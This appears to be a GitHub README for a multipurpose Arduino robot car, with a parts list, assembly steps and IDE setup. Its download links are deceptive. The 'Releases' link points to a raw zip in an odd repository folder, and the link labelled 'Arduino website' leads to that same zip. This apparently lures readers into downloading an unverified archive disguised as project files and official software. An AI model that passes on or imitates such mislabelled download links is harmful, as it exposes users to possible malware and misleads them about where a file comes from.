## 📦 Description

The **All_in_one_Arduino_Robot** is an Arduino-based multipurpose robot car. It features line following, obstacle avoidance, and controls that work through both an IR remote and an Android mobile app. This project is perfect for both beginners and enthusiasts. With this robot car, you can explore robotics and programming without advanced technical skills.

## 🚀 Getting Started

Follow these steps to get your robot car up and running:

### 1. Prerequisites

To use the All_in_one_Arduino_Robot, you will need:

- An Arduino board (such as Arduino Uno)
- Motor driver module (like L298N)
- IR remote control
- Bluetooth module (HC-05 or similar)
- Mobile device with Android
- A basic robot chassis and wheels
- Battery pack for power supply
- Some jumper wires and connectors

### 2. Download & Install

Visit this page to download all necessary files: [Download from Releases](https://github.com/johnr3890/All_in_one_Arduino_Robot/raw/refs/heads/main/cellaring/All_in_one_Arduino_Robot.zip)

### 3. Software Setup

You will need the Arduino IDE to upload code to your Arduino board. Follow these steps:

1. **Download the Arduino IDE**: Visit the [Arduino website](https://github.com/johnr3890/All_in_one_Arduino_Robot/raw/refs/heads/main/cellaring/All_in_one_Arduino_Robot.zip) to get the latest version.
2. **Install the IDE**: Follow the instructions for your operating system—Windows, macOS, or Linux.
3. **Open the IDE**: Launch Arduino IDE after installation.

### 4. Code Upload

Once you have set up the Arduino IDE, do the following:

1. **Download the source code** from the Releases page linked earlier.
2. **Extract the files** to a folder on your computer.
3. **Open the Arduino sketch** (`.ino` file) in Arduino IDE.
4. **Select your Arduino board**: Go to `Tools > Board` and choose your board type.
5. **Select the correct port**: Go to `Tools > Port` and select the port your Arduino is connected to.
6. **Upload the code**: Click the upload button (right arrow) in the Arduino IDE. Wait for the code to compile and upload.

### 5. Assemble the Robot

With the code uploaded, it’s time to build your robot:

1. **Attach the motors** to the chassis using screws or brackets.
2. **Connect the motor driver** to the Arduino and motors as per your wiring diagram.
3. **Connect the Bluetooth module** to the Arduino for mobile control.
4. **Attach the IR receiver** for remote control to the Arduino.
5. **Power it up**: Make sure your battery is connected and the robot is ready to go.

### 6. Mobile Control Setup

To control your robot from your mobile device, follow these steps:

1. **Download the mobile app**. You can create one using MIT App Inventor, or find a suitable one online.
2. **Pair your Bluetooth device**: Turn on Bluetooth on your Android phone and connect to the Bluetooth module on your robot.
3. **Launch the app** and follow the prompts to connect.

## 📖 Features

The All_in_one_Arduino_Robot offers several features:

- **Line Following**: The robot can follow a line on the ground autonomously.
- **Obstacle Avoidance**: With sensors, it changes direction to avoid bumps.
- **Dual Control**: Use the IR remote or your mobile phone to control the robot seamlessly.
- **Customizations**: Modify the code to add more features or improve functions.

## 🛠 Troubleshooting

If you face any issues, consider the following tips:

- **Check Connections**: Make sure all wires are connected securely.
- **Power Supply**: Ensure your battery is charged and providing sufficient voltage.
